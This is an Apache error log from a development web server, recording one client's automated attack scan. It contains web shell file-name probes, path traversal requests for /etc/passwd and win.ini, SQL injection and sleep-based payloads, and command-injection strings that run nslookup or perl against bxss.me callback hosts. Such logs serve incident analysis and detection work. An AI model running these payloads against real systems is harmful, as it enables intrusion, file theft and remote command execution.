[Wed Jul 07 19:29:05.906186 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/r57shell.php' not found or unable to stat
[Wed Jul 07 19:29:05.951339 2021] [php7:error] [pid 14367] [client 27.147.202.214:11345] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/pi.php' not found or unable to stat
[Wed Jul 07 19:29:05.960774 2021] [php7:error] [pid 14808] [client 27.147.202.214:10914] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/webadmin.php' not found or unable to stat
[Wed Jul 07 19:29:06.214300 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/r57.php' not found or unable to stat
[Wed Jul 07 19:29:06.537658 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/r58.php' not found or unable to stat
[Wed Jul 07 19:29:06.586407 2021] [php7:error] [pid 14367] [client 27.147.202.214:11345] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/php.php' not found or unable to stat
[Wed Jul 07 19:29:06.648180 2021] [core:error] [pid 14796] (36)File name too long: [client 27.147.202.214:9080] AH00036: access to /;(nslookup hitnqniyirgyq21758.bxss.me||perl -e "gethostbyname('hitnqniyirgyq21758.bxss.me')")|(nslookup hitnqniyirgyq21758.bxss.me||perl -e "gethostbyname('hitnqniyirgyq21758.bxss.me')")&(nslookup hitnqniyirgyq21758.bxss.me||perl -e "gethostbyname('hitnqniyirgyq21758.bxss.me')")/_notes/ failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitnqniyirgyq21758.bxss.me||perl -e "gethostbyname('hitnqniyirgyq21758.bxss.me')")|(nslookup hitnqniyirgyq21758.bxss.me||perl -e "gethostbyname('hitnqniyirgyq21758.bxss.me')")&(nslookup hitnqniyirgyq21758.bxss.me||perl -e "gethostbyname('hitnqniyirgyq21758.bxss.me')")')
[Wed Jul 07 19:29:06.677748 2021] [authz_core:error] [pid 14910] [client 27.147.202.214:9081] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/_notes/.htaccess
[Wed Jul 07 19:29:06.853369 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/c99shell.php' not found or unable to stat
[Wed Jul 07 19:29:06.918956 2021] [php7:error] [pid 14367] [client 27.147.202.214:11345] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/i.php' not found or unable to stat
[Wed Jul 07 19:29:07.180946 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/c99.php' not found or unable to stat
[Wed Jul 07 19:29:07.256306 2021] [php7:error] [pid 14367] [client 27.147.202.214:11345] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/test.php' not found or unable to stat
[Wed Jul 07 19:29:07.316148 2021] [core:error] [pid 14467] [client 27.147.202.214:11250] AH00126: Invalid URI in request GET /css/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:07.486885 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/nstview.php' not found or unable to stat
[Wed Jul 07 19:29:07.576276 2021] [core:error] [pid 14856] [client 27.147.202.214:9074] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:07.590892 2021] [php7:error] [pid 14367] [client 27.147.202.214:11345] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/temp.php' not found or unable to stat
[Wed Jul 07 19:29:07.790274 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/nst.php' not found or unable to stat
[Wed Jul 07 19:29:07.905238 2021] [core:error] [pid 14336] [client 27.147.202.214:1266] AH00126: Invalid URI in request GET /js/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:07.916642 2021] [core:error] [pid 14692] [client 27.147.202.214:1173] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:07.928121 2021] [php7:error] [pid 14367] [client 27.147.202.214:11345] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/info.php' not found or unable to stat
[Wed Jul 07 19:29:08.109812 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/rst.php' not found or unable to stat
[Wed Jul 07 19:29:08.464445 2021] [php7:error] [pid 14384] [client 27.147.202.214:11274] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/r57eng.php' not found or unable to stat
[Wed Jul 07 19:29:08.693592 2021] [authz_core:error] [pid 14456] [client 27.147.202.214:13736] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/_notes/.htaccess~
[Wed Jul 07 19:29:08.789853 2021] [php7:error] [pid 14493] [client 27.147.202.214:9093] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/shell.php' not found or unable to stat
[Wed Jul 07 19:29:08.902232 2021] [core:error] [pid 14906] [client 27.147.202.214:1602] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:09.006963 2021] [authz_core:error] [pid 14456] [client 27.147.202.214:13736] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/_notes/.htaccess.old
[Wed Jul 07 19:29:09.098060 2021] [php7:error] [pid 14356] [client 27.147.202.214:9113] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/dra.php' not found or unable to stat
[Wed Jul 07 19:29:09.217859 2021] [core:error] [pid 14493] [client 27.147.202.214:9093] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:09.313068 2021] [authz_core:error] [pid 14456] [client 27.147.202.214:13736] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/_notes/.htaccess.save
[Wed Jul 07 19:29:09.704896 2021] [core:error] [pid 14344] [client 27.147.202.214:1418] AH00126: Invalid URI in request GET /css/../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:09.936663 2021] [core:error] [pid 14372] [client 27.147.202.214:1603] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Wed Jul 07 19:29:10.037044 2021] [core:error] [pid 14796] [client 27.147.202.214:9080] AH00126: Invalid URI in request GET /css/../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:10.102224 2021] [php7:error] [pid 14356] [client 27.147.202.214:9113] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/r.php' not found or unable to stat
[Wed Jul 07 19:29:10.289632 2021] [core:error] [pid 14456] [client 27.147.202.214:13736] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Wed Jul 07 19:29:10.433712 2021] [php7:error] [pid 14356] [client 27.147.202.214:9113] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/lol.php' not found or unable to stat
[Wed Jul 07 19:29:10.758931 2021] [php7:error] [pid 14356] [client 27.147.202.214:9113] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/zehir.php' not found or unable to stat
[Wed Jul 07 19:29:11.009444 2021] [core:error] [pid 14467] [client 27.147.202.214:5717] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:11.076390 2021] [php7:error] [pid 14356] [client 27.147.202.214:9113] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/c-h.v2.php' not found or unable to stat
[Wed Jul 07 19:29:11.240815 2021] [core:error] [pid 14906] [client 27.147.202.214:5746] AH00126: Invalid URI in request GET /css/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:11.389890 2021] [php7:error] [pid 14799] [client 27.147.202.214:13740] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/php-backdoor.php' not found or unable to stat
[Wed Jul 07 19:29:11.710388 2021] [php7:error] [pid 14799] [client 27.147.202.214:13740] script '/var/www/html/dev.wilkescw.com/js/extention/_notes/simple-backdoor.php' not found or unable to stat
[Wed Jul 07 19:29:12.504512 2021] [core:error] [pid 14403] (36)File name too long: [client 27.147.202.214:1570] AH00036: access to /;(nslookup hitrlkefrzuhd620d8.bxss.me||perl -e "gethostbyname('hitrlkefrzuhd620d8.bxss.me')")|(nslookup hitrlkefrzuhd620d8.bxss.me||perl -e "gethostbyname('hitrlkefrzuhd620d8.bxss.me')")&(nslookup hitrlkefrzuhd620d8.bxss.me||perl -e "gethostbyname('hitrlkefrzuhd620d8.bxss.me')")/extention/ failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitrlkefrzuhd620d8.bxss.me||perl -e "gethostbyname('hitrlkefrzuhd620d8.bxss.me')")|(nslookup hitrlkefrzuhd620d8.bxss.me||perl -e "gethostbyname('hitrlkefrzuhd620d8.bxss.me')")&(nslookup hitrlkefrzuhd620d8.bxss.me||perl -e "gethostbyname('hitrlkefrzuhd620d8.bxss.me')")')
[Wed Jul 07 19:29:12.577917 2021] [core:error] [pid 14367] [client 27.147.202.214:11345] AH00126: Invalid URI in request GET /css/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:12.856329 2021] [core:error] [pid 14336] [client 27.147.202.214:5739] AH00126: Invalid URI in request GET /css/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:12.910502 2021] [core:error] [pid 14448] [client 27.147.202.214:3484] AH00126: Invalid URI in request GET /css/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:13.226391 2021] [core:error] [pid 14403] [client 27.147.202.214:1570] AH00126: Invalid URI in request GET /css/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:13.780719 2021] [core:error] [pid 14856] [client 27.147.202.214:3590] AH00126: Invalid URI in request GET /css/../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:14.103752 2021] [core:error] [pid 14891] [client 27.147.202.214:5716] AH00126: Invalid URI in request GET /css/../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:14.417120 2021] [core:error] [pid 14356] [client 27.147.202.214:9113] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:15.413134 2021] [core:error] [pid 14336] (36)File name too long: [client 27.147.202.214:3697] AH00036: access to /images/;(nslookup hitowlzvzfrnr7ed83.bxss.me||perl -e "gethostbyname('hitowlzvzfrnr7ed83.bxss.me')")|(nslookup hitowlzvzfrnr7ed83.bxss.me||perl -e "gethostbyname('hitowlzvzfrnr7ed83.bxss.me')")&(nslookup hitowlzvzfrnr7ed83.bxss.me||perl -e "gethostbyname('hitowlzvzfrnr7ed83.bxss.me')")/ failed (filesystem path '/var/www/html/dev.wilkescw.com/images/;(nslookup hitowlzvzfrnr7ed83.bxss.me||perl -e "gethostbyname('hitowlzvzfrnr7ed83.bxss.me')")|(nslookup hitowlzvzfrnr7ed83.bxss.me||perl -e "gethostbyname('hitowlzvzfrnr7ed83.bxss.me')")&(nslookup hitowlzvzfrnr7ed83.bxss.me||perl -e "gethostbyname('hitowlzvzfrnr7ed83.bxss.me')")')
[Wed Jul 07 19:29:15.590687 2021] [core:error] [pid 14427] [client 27.147.202.214:3625] AH00126: Invalid URI in request GET /css/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:16.422114 2021] [core:error] [pid 14857] [client 27.147.202.214:1764] AH00126: Invalid URI in request GET /css/../../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:29:17.361537 2021] [core:error] [pid 14456] [client 27.147.202.214:3863] AH00126: Invalid URI in request GET /css/../../../../../web.config HTTP/1.1
[Wed Jul 07 19:29:18.294094 2021] [core:error] [pid 14890] [client 27.147.202.214:9792] AH00126: Invalid URI in request GET /css/../../../../../package.json HTTP/1.1
[Wed Jul 07 19:29:18.432732 2021] [php7:error] [pid 14340] [client 27.147.202.214:11873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:18.612001 2021] [core:error] [pid 14813] [client 27.147.202.214:3791] AH00126: Invalid URI in request GET /css/../../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:29:21.206614 2021] [authz_core:error] [pid 14808] [client 27.147.202.214:10914] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/_notes/.htaccess~
[Wed Jul 07 19:29:21.260333 2021] [php7:error] [pid 14340] [client 27.147.202.214:11873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:21.524621 2021] [authz_core:error] [pid 14808] [client 27.147.202.214:10914] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/_notes/.htaccess.old
[Wed Jul 07 19:29:21.610861 2021] [core:error] [pid 15008] (36)File name too long: [client 27.147.202.214:10080] AH00036: access to /js/;(nslookup hitlyvdrtqmum24a31.bxss.me||perl -e "gethostbyname('hitlyvdrtqmum24a31.bxss.me')")|(nslookup hitlyvdrtqmum24a31.bxss.me||perl -e "gethostbyname('hitlyvdrtqmum24a31.bxss.me')")&(nslookup hitlyvdrtqmum24a31.bxss.me||perl -e "gethostbyname('hitlyvdrtqmum24a31.bxss.me')")/ failed (filesystem path '/var/www/html/dev.wilkescw.com/js/;(nslookup hitlyvdrtqmum24a31.bxss.me||perl -e "gethostbyname('hitlyvdrtqmum24a31.bxss.me')")|(nslookup hitlyvdrtqmum24a31.bxss.me||perl -e "gethostbyname('hitlyvdrtqmum24a31.bxss.me')")&(nslookup hitlyvdrtqmum24a31.bxss.me||perl -e "gethostbyname('hitlyvdrtqmum24a31.bxss.me')")')
[Wed Jul 07 19:29:21.925764 2021] [negotiation:error] [pid 14403] [client 27.147.202.214:3757] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/admin/schedules (None could be negotiated).
[Wed Jul 07 19:29:22.511786 2021] [core:error] [pid 14937] [client 27.147.202.214:11350] AH00126: Invalid URI in request GET /fonts/OpenSans//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:22.688110 2021] [php7:error] [pid 14448] [client 27.147.202.214:10083] script '/var/www/html/dev.wilkescw.com/schedules.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:22.843798 2021] [core:error] [pid 14375] [client 27.147.202.214:1398] AH00126: Invalid URI in request GET /fonts/OpenSans//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:23.028550 2021] [authz_core:error] [pid 14785] [client 27.147.202.214:10159] AH01630: client denied by server configuration: /var/www/html/dev.wilkescw.com/js/extention/_notes/.htaccess.save
[Wed Jul 07 19:29:23.132725 2021] [php7:error] [pid 15014] [client 27.147.202.214:10153] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/
[Wed Jul 07 19:29:24.872598 2021] [core:error] [pid 14799] [client 27.147.202.214:13740] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:25.024979 2021] [php7:error] [pid 14785] [client 27.147.202.214:10159] script '/var/www/html/dev.wilkescw.com/admin/EM6IpZ5s.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:25.174838 2021] [core:error] [pid 14890] [client 27.147.202.214:10156] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:25.360341 2021] [php7:error] [pid 15010] [client 27.147.202.214:10015] script '/var/www/html/dev.wilkescw.com/admin/-1 OR 2+140-140-1=0+0+0+1 -- .php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:25.507961 2021] [core:error] [pid 14376] [client 27.147.202.214:3516] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:25.686288 2021] [php7:error] [pid 15010] [client 27.147.202.214:10015] script '/var/www/html/dev.wilkescw.com/admin/-1 OR 2+166-166-1=0+0+0+1.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:25.812429 2021] [core:error] [pid 14415] [client 27.147.202.214:10078] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:26.003489 2021] [php7:error] [pid 15010] [client 27.147.202.214:10015] script '/var/www/html/dev.wilkescw.com/admin/-1' OR 2+106-106-1=0+0+0+1 -- .php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:26.317767 2021] [core:error] [pid 15019] [client 27.147.202.214:10164] AH00126: Invalid URI in request GET /fonts/OpenSans//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:26.321085 2021] [php7:error] [pid 15010] [client 27.147.202.214:10015] script '/var/www/html/dev.wilkescw.com/admin/-1' OR 2+883-883-1=0+0+0+1 or 'oEMd9hw6'='.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:26.628402 2021] [core:error] [pid 14910] (36)File name too long: [client 27.147.202.214:9081] AH00036: access to /;(nslookup hitvmfohycivb8c9f3.bxss.me||perl -e "gethostbyname('hitvmfohycivb8c9f3.bxss.me')")|(nslookup hitvmfohycivb8c9f3.bxss.me||perl -e "gethostbyname('hitvmfohycivb8c9f3.bxss.me')")&(nslookup hitvmfohycivb8c9f3.bxss.me||perl -e "gethostbyname('hitvmfohycivb8c9f3.bxss.me')")/schedules.php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitvmfohycivb8c9f3.bxss.me||perl -e "gethostbyname('hitvmfohycivb8c9f3.bxss.me')")|(nslookup hitvmfohycivb8c9f3.bxss.me||perl -e "gethostbyname('hitvmfohycivb8c9f3.bxss.me')")&(nslookup hitvmfohycivb8c9f3.bxss.me||perl -e "gethostbyname('hitvmfohycivb8c9f3.bxss.me')")')
[Wed Jul 07 19:29:26.652934 2021] [php7:error] [pid 15010] [client 27.147.202.214:10015] script '/var/www/html/dev.wilkescw.com/admin/-1" OR 2+188-188-1=0+0+0+1 -- .php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:26.653101 2021] [core:error] [pid 14359] [client 27.147.202.214:5728] AH00126: Invalid URI in request GET /fonts/OpenSans//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:26.794595 2021] [core:error] [pid 14383] [client 27.147.202.214:10859] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:29:27.177488 2021] [core:error] [pid 14856] [client 27.147.202.214:3799] AH00126: Invalid URI in request GET /css//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:29:29.600929 2021] [php7:error] [pid 14456] [client 27.147.202.214:9926] script '/var/www/html/dev.wilkescw.com/students.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:29.977210 2021] [core:error] [pid 14906] [client 27.147.202.214:9929] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:29:30.427152 2021] [php7:error] [pid 15017] [client 27.147.202.214:10163] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/schedules.php?930836@
[Wed Jul 07 19:29:30.809055 2021] [core:error] [pid 14460] (36)File name too long: [client 27.147.202.214:14509] AH00036: access to /;(nslookup hitzouakeqssw8c1ca.bxss.me||perl -e "gethostbyname('hitzouakeqssw8c1ca.bxss.me')")|(nslookup hitzouakeqssw8c1ca.bxss.me||perl -e "gethostbyname('hitzouakeqssw8c1ca.bxss.me')")&(nslookup hitzouakeqssw8c1ca.bxss.me||perl -e "gethostbyname('hitzouakeqssw8c1ca.bxss.me')")/style.css failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hitzouakeqssw8c1ca.bxss.me||perl -e "gethostbyname('hitzouakeqssw8c1ca.bxss.me')")|(nslookup hitzouakeqssw8c1ca.bxss.me||perl -e "gethostbyname('hitzouakeqssw8c1ca.bxss.me')")&(nslookup hitzouakeqssw8c1ca.bxss.me||perl -e "gethostbyname('hitzouakeqssw8c1ca.bxss.me')")')
[Wed Jul 07 19:29:30.822055 2021] [core:error] [pid 15013] [client 27.147.202.214:10155] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Wed Jul 07 19:29:30.966384 2021] [core:error] [pid 14337] [client 27.147.202.214:7974] AH00126: Invalid URI in request GET /js/extention//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:31.144640 2021] [core:error] [pid 14456] [client 27.147.202.214:9926] AH00126: Invalid URI in request GET /css//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:31.363989 2021] [core:error] [pid 14420] [client 27.147.202.214:10915] AH00126: Invalid URI in request GET /fonts/OpenSans//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:31.670312 2021] [core:error] [pid 14813] [client 27.147.202.214:9995] AH00126: Invalid URI in request GET /fonts/OpenSans//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:31.754426 2021] [core:error] [pid 14364] [client 27.147.202.214:3589] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:29:32.280718 2021] [php7:error] [pid 15017] [client 27.147.202.214:10163] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/schedules.php?id=981145@
[Wed Jul 07 19:29:32.348114 2021] [negotiation:error] [pid 14857] [client 27.147.202.214:9873] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/admin/users (None could be negotiated).
[Wed Jul 07 19:29:32.758334 2021] [php7:error] [pid 14785] [client 27.147.202.214:10159] script '/var/www/html/dev.wilkescw.com/admin/if(now()=sysdate(),sleep(15),0).php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:32.940425 2021] [negotiation:error] [pid 15009] [client 27.147.202.214:14562] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/dev.wilkescw.com/admin/students (None could be negotiated).
[Wed Jul 07 19:29:33.196024 2021] [php7:error] [pid 14382] [client 27.147.202.214:14548] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/students.php?930425@
[Wed Jul 07 19:29:33.467576 2021] [core:error] [pid 13710] [client 27.147.202.214:13739] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:29:34.106913 2021] [core:error] [pid 15011] [client 27.147.202.214:8135] AH00126: Invalid URI in request GET /fonts/OpenSans//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:29:34.148468 2021] [php7:error] [pid 14692] [client 27.147.202.214:8076] script '/var/www/html/dev.wilkescw.com/users.php' not found or unable to stat, referer: https://dev.wilkescw.com/
[Wed Jul 07 19:29:34.304906 2021] [core:error] [pid 15012] [client 27.147.202.214:10149] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:29:34.407055 2021] [php7:error] [pid 14904] [client 27.147.202.214:10910] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/admin/students.php?id=986624@
[Wed Jul 07 19:29:35.318233 2021] [core:error] [pid 15013] (36)File name too long: [client 27.147.202.214:1162] AH00036: access to /;(nslookup hittjoxblbjyc22c10.bxss.me||perl -e "gethostbyname('hittjoxblbjyc22c10.bxss.me')")|(nslookup hittjoxblbjyc22c10.bxss.me||perl -e "gethostbyname('hittjoxblbjyc22c10.bxss.me')")&(nslookup hittjoxblbjyc22c10.bxss.me||perl -e "gethostbyname('hittjoxblbjyc22c10.bxss.me')")/students.php failed (filesystem path '/var/www/html/dev.wilkescw.com/;(nslookup hittjoxblbjyc22c10.bxss.me||perl -e "gethostbyname('hittjoxblbjyc22c10.bxss.me')")|(nslookup hittjoxblbjyc22c10.bxss.me||perl -e "gethostbyname('hittjoxblbjyc22c10.bxss.me')")&(nslookup hittjoxblbjyc22c10.bxss.me||perl -e "gethostbyname('hittjoxblbjyc22c10.bxss.me')")')
[Wed Jul 07 19:29:35.555919 2021] [core:error] [pid 14419] [client 27.147.202.214:8081] AH00126: Invalid URI in request GET /js/extention//../../../../../../../../boot.ini HTTP/1.1
[Wed Jul 07 19:29:36.382504 2021] [php7:error] [pid 14857] [client 27.147.202.214:9873] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat
[Wed Jul 07 19:29:36.463278 2021] [php7:error] [pid 14382] [client 27.147.202.214:14548] script '/var/www/html/dev.wilkescw.com/admin/error.php' not found or unable to stat, referer: https://dev.wilkescw.com/
